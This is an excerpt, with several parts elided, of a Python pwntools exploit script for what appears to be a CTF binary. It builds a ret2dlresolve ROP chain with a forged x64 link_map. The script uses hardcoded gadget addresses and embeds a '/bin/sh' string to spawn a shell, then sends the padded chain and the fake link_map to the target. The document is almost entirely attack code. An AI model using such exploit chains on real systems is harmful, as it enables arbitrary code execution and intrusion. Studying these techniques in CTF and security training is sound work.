...
bss_addr = elf.bss()
print(hex(bss_addr))
csu_front_addr = 0x401198
csu_end_addr = 0x4011b2
vuln_addr = 0x401122
...
def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
    ...
    linkmap += b'/bin/sh\x00'           # cmd offset 0x48
...
rop.raw(vuln_addr)
rop.raw("a"*(200-len(rop.chain())))
assert(len(rop.chain()) <= 200)
io.send(rop.chain())
# send linkmap
io.send(link_map)
...
rop.raw(0x00000000004011b9)  # stack align 16 bytes
rop.raw(0)
rop.raw(0)
rop.raw(0x00000000004011bb)  # 0x00000000004007a3: pop rdi; ret;
